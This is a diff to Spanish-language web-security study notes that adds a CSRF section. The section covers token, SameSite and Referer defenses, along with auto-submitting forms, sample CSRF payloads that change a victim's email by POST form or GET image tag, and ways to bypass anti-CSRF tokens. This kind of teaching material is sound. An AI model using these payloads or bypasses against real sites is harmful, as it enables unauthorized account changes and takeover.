@@ -583,9 +583,10 @@ Cross site request forgery, es cuando el servidor permite ejecutar funciones con
 2. Ligas maliciosas: Ligas con parametros GET que al ejecutarse toma la sesión activa del usuario y realiza el ataque.
 3. Ficheros HTML: Ficheros html que al abrirse en automatico ejecuten un script que redireccione con un form a la URL vulnerable.
 
-### Anti-CSRF:
+### Medidas comunes:
 Medidas comunes que usan las aplicaciones para evitar CSRF es:
 
+#### CSRF:
 1. El servidor inyecta un token random en cada formulario o en una cookie.
 ```html
 <input type="hidden" name="csrf_token" value="4f92ef1c-f74e-4f8b-b0c3-a61cf8fadc31">
@@ -596,6 +597,55 @@ X-CSRF-Token
 3. El cliente envia el token en cada request.
 4. El servidor valida que ese token coincida con el de la sesión del usuario.
 5. El servidor valida que el Referer o Origin coincida con dominios de confianza.
+
+#### SameSite Cookies:
+Cookies con la bandera samesite no permiten compartir información con otros sitios, aunque los navegadores modernos como chrome, ya implementan medidas ligeras para evitar el robo de cookies.
+
+#### Referer-based validation:
+Se valida que el "Origin" sea de una lista de dominios de confianza.
+
+### Autoejecución del Form:
+Es clave el metodo a usar para ejecutar en automatico acciones al ingresar y redireccionar al usuario con la información maliciosa, enumeraremos algunas:
+
+1. Script de Javascript:
+```html
+<script>
+  document.forms[0].submit();
+</script>
+```
+
+2. Carga de evento:
+```html
+<body onload="document.forms[0].submit()">
+```
+
+### Ejemplos de ataques:
+
+#### Sin evasión:
+1. Basico sin protección por POST:
+```html
+<body onload="document.forms[0].submit()">
+<form action="https://academy.net/my-account/change-email" method="POST">
+<input name="email" type="hidden" value="email=evaa@aa.com">
+</form>
+```
+
+2. Basico sin protección por GET:
+```html
+<img src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net"></img>
+```
+
+### Tipos de evasiones de CSRF:
+1. Metodo alterno sin validación del token:
+   - Modificando el request original de POST a GET y validando sí por GET no pide el token y permite ejecutar la acción.
+2. Eliminar el valor del input:
+   - Algunas aplicaciones cuando no detectan que el request venga el parametro anticsrf lo dejan pasar como un request valido.
+3. CSRF de otro usuario:
+   - Algunas aplicaciones no validan sí el token solo es valido para un solo usuario, entonces sí usas otro que este vivo, podria aceptar el request.
+   - NOTA: Usualmente los tokens necesitan estar vivos y no haber sido usados, por lo que habra que generar tokens nuevos con otro usuario.
+4. 
+
+
 
 ## IDOR:
 Mal asignación de permisos para ver recursos que solo deberian pertenecerle a un usuario, ejemplo: /read.php?file=reporte_enero.pdf sí esté URL es accesible para todos los usuarios pero solo deberia poder verlo quien lo subio.
